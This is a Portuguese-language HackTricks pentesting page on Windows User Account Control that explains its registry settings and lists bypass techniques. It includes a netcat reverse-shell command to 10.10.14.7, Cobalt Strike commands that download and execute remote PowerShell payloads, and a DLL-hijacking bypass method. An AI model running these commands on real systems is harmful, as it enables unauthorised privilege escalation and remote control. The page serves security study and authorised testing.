# UAC - Controle de Conta de Usuário

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas comunitárias mais avançadas do mundo**.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite uma **solicitação de consentimento para atividades elevadas**. Aplicações possuem diferentes níveis de `integridade`, e um programa com um **alto nível** pode realizar tarefas que **potencialmente comprometam o sistema**. Quando o UAC está ativado, aplicações e tarefas sempre **são executadas no contexto de segurança de uma conta de não administrador** a menos que um administrador autorize explicitamente essas aplicações/tarefas a terem acesso de nível de administrador para serem executadas. É um recurso de conveniência que protege os administradores de alterações não intencionais, mas não é considerado uma barreira de segurança.

Para mais informações sobre os níveis de integridade:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: uma chave de usuário padrão, para realizar ações regulares em nível regular, e outra com privilégios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute em grande profundidade como o UAC funciona e inclui o processo de logon, experiência do usuário e arquitetura do UAC. Os administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização em nível local (usando secpol.msc), ou configurado e distribuído via Objetos de Política de Grupo (GPO) em um ambiente de domínio Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 configurações de Política de Grupo que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Configuração de Política de Grupo                                                                                                                                                                                                                                                                                                                                                   | Chave do Registro           | Configuração Padrão                                         |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [Controle de Conta de Usuário: Modo de Aprovação de Administrador para a conta de Administrador integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Desativado                                                   |
| [Controle de Conta de Usuário: Permitir que aplicações UIAccess solicitem elevação sem usar a área de trabalho segura](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Desativado                                                   |
| [Controle de Conta de Usuário: Comportamento da solicitação de elevação para administradores no Modo de Aprovação de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimento para binários não-Windows           |
| [Controle de Conta de Usuário: Comportamento da solicitação de elevação para usuários padrão](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciais na área de trabalho segura            |
| [Controle de Conta de Usuário: Detectar instalações de aplicativos e solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ativado (padrão para doméstico) Desativado (padrão para empresa) |
| [Controle de Conta de Usuário: Apenas elevar executáveis que são assinados e validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Desativado                                                   |
| [Controle de Conta de Usuário: Apenas elevar aplicações UIAccess que estão instaladas em locais seguros](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ativado                                                      |
| [Controle de Conta de Usuário: Executar todos os administradores no Modo de Aprovação de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ativado                                                      |
| [Controle de Conta de Usuário: Alternar para a área de trabalho segura ao solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ativado                                                      |
| [Controle de Conta de Usuário: Virtualizar falhas de gravação de arquivos e registro em locais por usuário](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Ativado                                                      |
### Teoria de Bypass do UAC

Alguns programas são **automaticamente autoelevados** se o **usuário pertencer** ao **grupo de administradores**. Esses binários possuem em seus _**Manifestos**_ a opção _**autoElevate**_ com o valor _**True**_. O binário também precisa ser **assinado pela Microsoft**.

Assim, para **burlar** o **UAC** (elevar de **nível de integridade médio** para alto), alguns atacantes usam esse tipo de binário para **executar código arbitrário** porque ele será executado a partir de um **processo de alto nível de integridade**.

Você pode **verificar** o _**Manifesto**_ de um binário usando a ferramenta _**sigcheck.exe**_ do Sysinternals. E você pode **ver** o **nível de integridade** dos processos usando o _Process Explorer_ ou _Process Monitor_ (do Sysinternals).

### Verificar UAC

Para confirmar se o UAC está habilitado, faça:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se for **`1`**, então o UAC está **ativado**, se for **`0`** ou **não existir**, então o UAC está **inativo**.

Em seguida, verifique **qual nível** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Se **`0`** então, o UAC não solicitará permissão (como **desativado**)
* Se **`1`** o administrador é **solicitado a fornecer nome de usuário e senha** para executar o binário com altos privilégios (na Área de Trabalho Segura)
* Se **`2`** (**Sempre me notificar**) o UAC sempre pedirá confirmação ao administrador quando ele tentar executar algo com altos privilégios (na Área de Trabalho Segura)
* Se **`3`** como `1` mas não é necessário na Área de Trabalho Segura
* Se **`4`** como `2` mas não é necessário na Área de Trabalho Segura
* Se **`5`** (**padrão**) pedirá ao administrador para confirmar a execução de binários não-Windows com altos privilégios

Em seguida, você deve verificar o valor de **`LocalAccountTokenFilterPolicy`**\
Se o valor for **`0`**, então, apenas o usuário RID 500 (**Administrador integrado**) pode realizar **tarefas de administração sem UAC**, e se for `1`, **todas as contas dentro do grupo "Administradores"** podem fazê-lo.

E, finalmente, verifique o valor da chave **`FilterAdministratorToken`**\
Se **`0`**(padrão), a **conta de Administrador integrado pode** realizar tarefas de administração remota e se **`1`** a conta integrada de Administrador **não pode** realizar tarefas de administração remota, a menos que `LocalAccountTokenFilterPolicy` esteja definido como `1`.

#### Resumo

* Se `EnableLUA=0` ou **não existir**, **nenhum UAC para ninguém**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1` , Nenhum UAC para ninguém**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, Nenhum UAC para RID 500 (Administrador integrado)**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC para todos**

Todas essas informações podem ser obtidas usando o módulo **metasploit**: `post/windows/gather/win_privs`

Você também pode verificar os grupos do seu usuário e obter o nível de integridade:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass do UAC

{% hint style="info" %}
Note que se você tiver acesso gráfico à vítima, o bypass do UAC é direto, pois você pode simplesmente clicar em "Sim" quando o prompt do UAC aparecer.
{% endhint %}

O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil contornar o UAC se estiver no nível de segurança mais alto (Sempre) do que se estiver em qualquer um dos outros níveis (Padrão).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**), você pode **executar um shell reverso com privilégios de administrador** (nível de integridade alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass do UAC com duplicação de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** básico "bypass" do UAC (acesso completo ao sistema de arquivos)

Se você tiver um shell com um usuário que está dentro do grupo Administradores, você pode **montar o compartilhamento C$** via SMB (sistema de arquivos) local em um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (até a pasta home do Administrador).

{% hint style="warning" %}
**Parece que esse truque não está mais funcionando**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass do UAC com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver definido em seu nível máximo de segurança.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também possuem vários módulos para **burlar** o **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME**](https://github.com/hfiref0x/UACME) que é uma **compilação** de vários exploits de bypass do UAC. Note que você precisará **compilar o UACME usando o Visual Studio ou msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual você precisa**.\
Você deve **ter cuidado** porque alguns bypasses irão **solicitar que outros programas** alertem o **usuário** de que algo está acontecendo.

O UACME possui a **versão de compilação a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Também, usando [esta](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) página você obtém o lançamento do Windows `1607` a partir das versões de compilação.

#### Mais bypass de UAC

**Todas** as técnicas usadas aqui para contornar o UAC **exigem** um **shell interativo completo** com a vítima (um shell nc.exe comum não é suficiente).

Você pode obter usando uma sessão **meterpreter**. Migrar para um **processo** que tenha o valor de **Sessão** igual a **1**:

![](<../../.gitbook/assets/image (863).png>)

(_explorer.exe_ deve funcionar)

### Bypass de UAC com GUI

Se você tiver acesso a uma **GUI, você pode simplesmente aceitar o prompt do UAC** quando o receber, você realmente não precisa de um bypass. Portanto, ter acesso a uma GUI permitirá que você contorne o UAC.

Além disso, se você obter uma sessão de GUI que alguém estava usando (potencialmente via RDP) há **algumas ferramentas que estarão sendo executadas como administrador** de onde você poderia **executar** um **cmd** por exemplo **como administrador** diretamente sem ser solicitado novamente pelo UAC como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **discreto**.

### Bypass de UAC de força bruta barulhento

Se você não se importa em ser barulhento, você sempre pode **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pede para elevar permissões até que o usuário aceite**.

### Seu próprio bypass - Metodologia básica de bypass de UAC

Se você der uma olhada no **UACME** você notará que **a maioria dos bypasses de UAC abusam de uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isso para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Encontre um binário que **autoeleve** (verifique se, quando é executado, ele roda em um nível de integridade alto).
2. Com o procmon, encontre eventos de "**NOME NÃO ENCONTRADO**" que podem ser vulneráveis ao **DLL Hijacking**.
3. Provavelmente você precisará **escrever** a DLL dentro de alguns **caminhos protegidos** (como C:\Windows\System32) onde você não tem permissões de escrita. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Permite extrair o conteúdo de um arquivo CAB dentro de caminhos protegidos (porque essa ferramenta é executada a partir de um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL dentro do caminho protegido e executar o binário vulnerável e autoelevado.

### Outra técnica de bypass de UAC

Consiste em observar se um **binário autoelevado** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essas informações dentro do **HKCU**).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
Tenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
